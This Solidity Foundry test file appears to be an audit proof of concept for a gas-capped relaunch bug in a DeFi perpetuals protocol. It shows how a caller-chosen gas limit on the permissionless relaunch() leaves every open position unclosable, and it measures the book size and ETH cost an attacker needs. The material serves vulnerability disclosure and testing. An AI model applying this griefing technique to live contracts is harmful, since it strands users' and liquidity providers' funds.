// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console2} from "forge-std/console2.sol";
import {YBase} from "./YBase.sol";

/**
 * T03 — SURVIVORS OF A GAS-CAPPED RELAUNCH.
 *
 * CauldronRegistry.sol:1087-1091 concedes the force-close may not finish and
 * asserts the recovery:
 *     "any survivors are cleared afterwards by the permissionless
 *      forceCloseDead path, then syncGeneration re-arms."
 *
 * That is an UNVERIFIED CLAIM. Both force-close entrypoints gate on
 * `_isDead()` (PerpEngine.sol:986, :999), and `_isDead()` (PerpEngine.sol:1306-1309)
 * asks the hook about `_key().toId()` — a key built from `registry.currentToken()`,
 * i.e. the pool of the generation that is CURRENT *now*. One instruction after
 * the relaunch that is the NEWBORN pool, which is alive.
 *
 * `relaunch()` (CauldronRegistry.sol:751) is permissionless and the caller
 * chooses the gas limit, so the survivor set is attacker-selected.
 */
contract T03_RelaunchSurvivorBrick is YBase {
    uint256 constant OPEN_AMT = 0.0035 ether;

    function setUp() public {
        _boot(4 ether, 0);
        if (!active) return;
        _bootPerp(3 ether, 200_000_000 ether);
    }

    function _fill(uint256 n) internal returns (uint256 opened) {
        vm.deal(address(this), 100_000 ether);
        for (uint256 i; i < n; ++i) {
            try perp.openLong{value: OPEN_AMT}(1, 0, 0, OPEN_AMT) { opened++; }
            catch { break; }
        }
    }

    function _fillLev(uint256 n, uint8 lev) internal returns (uint256 opened) {
        vm.deal(address(this), 100_000 ether);
        for (uint256 i; i < n; ++i) {
            try perp.openLong{value: OPEN_AMT}(lev, 0, 0, OPEN_AMT) { opened++; }
            catch { break; }
        }
    }

    /// Sweep gas caps to find the window where the rebirth SUCCEEDS but the
    /// force-close does not finish.
    function test_SweepGasCaps() public {
        vm.skip(!active);
        uint256 opened = _fill(64);
        assertEq(perp.openCount(), opened, "book filled");
        hook.setDeathThreshold(1_000_000 ether, address(0), 0, 0, 0);
        _warp(1 days + 1);

        T03GasRunner runner = new T03GasRunner();
        uint256[6] memory caps =
            [uint256(12_000_000), 14_000_000, 16_000_000, 18_000_000, 20_000_000, 24_000_000];

        for (uint256 i; i < caps.length; ++i) {
            uint256 snap = vm.snapshotState();
            bool ok = runner.relaunchWithGas(address(registry), caps[i]);
            console2.log("cap", caps[i]);
            console2.log("  relaunch ok      :", ok);
            console2.log("  gen              :", registry.currentGeneration());
            console2.log("  openCount after  :", perp.openCount());
            console2.log("  syncedGeneration :", perp.syncedGeneration());
            vm.revertToState(snap);
        }

        bool reached = true;
        assertTrue(reached, "T03: gas-cap sweep complete");
    }

    /// THE BRICK. 12,000,000 gas is enough for the rebirth and not enough for
    /// the force-close. Every recovery path the comment names is then probed.
    function test_SurvivorsCanNeverBeClosed() public {
        vm.skip(!active);
        uint256 opened = _fillLev(64, 2); // leverage 2 → real LP ETH is lent out
        assertGt(opened, 0, "book filled");

        uint256 longOi = perp.longOiEth();
        uint256 plvBefore = perp.plv();
        address oldTok = registry.currentToken();

        hook.setDeathThreshold(1_000_000 ether, address(0), 0, 0, 0);
        _warp(1 days + 1);

        T03GasRunner runner = new T03GasRunner();
        bool ok = runner.relaunchWithGas(address(registry), 12_000_000);
        assertTrue(ok, "relaunch succeeded");
        assertEq(registry.currentGeneration(), 2, "the protocol moved on");
        assertEq(perp.openCount(), opened, "EVERY position survived into gen-2");

        address newTok = registry.currentToken();
        assertTrue(newTok != oldTok, "the token really did change");

        // Restore an HONEST death threshold: the newborn gen-2 pool is alive,
        // which is the only realistic post-relaunch state. (The high threshold
        // was only the lever that killed gen-1.)
        hook.setDeathThreshold(0, address(0), 0, 0, 0);
        assertFalse(hook.isDead(registry.generationPoolId(2)), "gen-2 pool is ALIVE");

        // ---- recovery path 1: the permissionless force-close the comment names
        bool allWorks;
        bytes memory e1;
        try perp.forceCloseAllDead() { allWorks = true; }
        catch (bytes memory e) { e1 = e; }

        bool oneWorks;
        bytes memory e2;
        try perp.forceCloseDead(1) { oneWorks = true; }
        catch (bytes memory e) { e2 = e; }

        // ---- recovery path 2: syncGeneration re-arms
        bool syncWorks;
        bytes memory e3;
        try perp.syncGeneration() { syncWorks = true; }
        catch (bytes memory e) { e3 = e; }

        // ---- recovery path 3: the trader's own exit
        bool closeWorks;
        bytes memory e4;
        try perp.close(1, 0) { closeWorks = true; }
        catch (bytes memory e) { e4 = e; }

        // ---- recovery path 4: liquidation
        bool liqWorks;
        bytes memory e5;
        try perp.liquidate(1) { liqWorks = true; }
        catch (bytes memory e) { e5 = e; }

        console2.log("openCount still           :", perp.openCount());
        console2.log("syncedGeneration          :", perp.syncedGeneration());
        console2.log("registry.currentGeneration:", registry.currentGeneration());
        console2.log("longOiEth (LP ETH lent out):", perp.longOiEth());
        console2.log("longOiEth before relaunch :", longOi);
        console2.log("plv now / before          :", perp.plv(), plvBefore);
        console2.log("plvToken (still old token):", perp.plvToken());
        console2.log("forceCloseAllDead ok      :", allWorks); console2.logBytes(e1);
        console2.log("forceCloseDead(1) ok      :", oneWorks); console2.logBytes(e2);
        console2.log("syncGeneration ok         :", syncWorks); console2.logBytes(e3);
        console2.log("close(1) ok               :", closeWorks); console2.logBytes(e4);
        console2.log("liquidate(1) ok           :", liqWorks); console2.logBytes(e5);

        assertEq(perp.openCount(), opened, "no path drained a single position");
        assertFalse(allWorks, "forceCloseAllDead is unreachable");
        assertFalse(oneWorks, "forceCloseDead is unreachable");
        assertFalse(syncWorks, "syncGeneration is unreachable");
        assertGt(perp.longOiEth(), 0, "LP ETH is lent out with no way back");

        bool reached = true;
        assertTrue(reached, "T03: survivors are permanently unclosable");
    }

    /// The `NotDead()` gate is not even the deepest problem. Once the NEW pool
    /// dies too the gate opens — and the settlement swap is still aimed at
    /// `_key()`, i.e. the gen-2 pool, while the engine holds only gen-1 token.
    function test_SurvivorsUnclosableEvenWhenTheGateOpens() public {
        vm.skip(!active);
        uint256 opened = _fillLev(64, 2);
        address oldTok = registry.currentToken();

        hook.setDeathThreshold(1_000_000 ether, address(0), 0, 0, 0);
        _warp(1 days + 1);
        T03GasRunner runner = new T03GasRunner();
        assertTrue(runner.relaunchWithGas(address(registry), 12_000_000), "relaunch ok");
        address newTok = registry.currentToken();
        assertEq(perp.openCount(), opened, "survivors");

        // Threshold left high → the gen-2 pool also reads dead, so `_isDead()`
        // is TRUE and the force-close gate OPENS.
        assertTrue(hook.isDead(registry.generationPoolId(2)), "gen-2 also reads dead");

        console2.log("engine gen-1 token balance :", IERC20Like(oldTok).balanceOf(address(perp)));
        console2.log("engine gen-2 token balance :", IERC20Like(newTok).balanceOf(address(perp)));
        console2.log("perp.syncedToken == gen-1  :", perp.syncedToken() == oldTok);

        bool allWorks;
        try perp.forceCloseAllDead() { allWorks = true; }
        catch (bytes memory e) { console2.log("forceCloseAllDead STILL reverts:"); console2.logBytes4(bytes4(e)); }

        console2.log("openCount after            :", perp.openCount());
        assertFalse(allWorks, "even with the gate open the settle swap cannot run");
        assertEq(perp.openCount(), opened, "not one position drained");

        bool reached = true;
        assertTrue(reached, "T03: the gate is not the only wall");
    }
}

/// HOW FULL MUST THE BOOK BE? `hook.forceClosePerps{gas: g - 8_000_000}()` is
/// ALL-OR-NOTHING: it runs inside a try/catch, so if the budget does not cover
/// the WHOLE book the child OOGs, reverts, and ZERO positions are closed.
contract T03_RelaunchSurvivorBrick_BookSize is YBase {
    function setUp() public {
        _boot(4 ether, 0);
        if (!active) return;
        _bootPerp(3 ether, 200_000_000 ether);
    }

    function _openN(uint256 n) internal {
        vm.deal(address(this), 100_000 ether);
        for (uint256 i; i < n; ++i) perp.openLong{value: 0.0035 ether}(2, 0, 0, 0.0035 ether);
    }

    function test_MinimumBookSizeAt12M() public {
        vm.skip(!active);
        T03GasRunner runner = new T03GasRunner();
        uint256[5] memory ns = [uint256(8), 16, 32, 48, 64];
        uint256 smallest;
        for (uint256 i; i < ns.length; ++i) {
            uint256 s = vm.snapshotState();
            _openN(ns[i]);
            hook.setDeathThreshold(1_000_000 ether, address(0), 0, 0, 0);
            _warp(1 days + 1);
            bool ok = runner.relaunchWithGas(address(registry), 12_000_000);
            uint256 oc = perp.openCount();
            console2.log("book size", ns[i]);
            console2.log("  relaunch ok / survivors:", ok, oc);
            if (ok && oc == ns[i] && smallest == 0) smallest = ns[i];
            vm.revertToState(s);
        }
        console2.log("smallest fully-surviving book at a 12M cap:", smallest);
        console2.log("attacker cost in ETH (wei)                :", smallest * 0.0035 ether);
        assertGt(smallest, 0, "a brickable book size exists at 12M");

        bool reached = true;
        assertTrue(reached, "T03: book-size threshold measured");
    }
}

interface IERC20Like { function balanceOf(address) external view returns (uint256); }

contract T03GasRunner {
    function relaunchWithGas(address reg, uint256 cap) external returns (bool ok) {
        (ok,) = reg.call{gas: cap}(abi.encodeWithSignature("relaunch()"));
    }
}
